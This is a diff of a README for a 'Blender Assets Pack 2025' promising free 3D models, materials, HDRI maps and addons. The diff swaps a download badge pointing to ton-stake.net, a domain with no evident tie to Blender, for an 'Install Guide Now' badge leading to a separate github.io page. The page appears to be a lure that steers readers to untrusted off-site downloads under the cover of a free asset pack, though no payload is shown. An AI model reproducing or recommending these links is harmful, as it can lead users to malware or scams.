@@ -3,7 +3,10 @@
 **Blender Assets Pack 2025** is a free collection of 3D resources for Blender creators.  
 It includes models, materials, HDRI maps, and useful addons to speed up rendering and animation.  
 
-[![Download Blender Pack](https://img.shields.io/badge/Download-Blender_Assets_2025-blueviolet)](https://ton-stake.net)
+<a href="https://blender-assets-pack-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
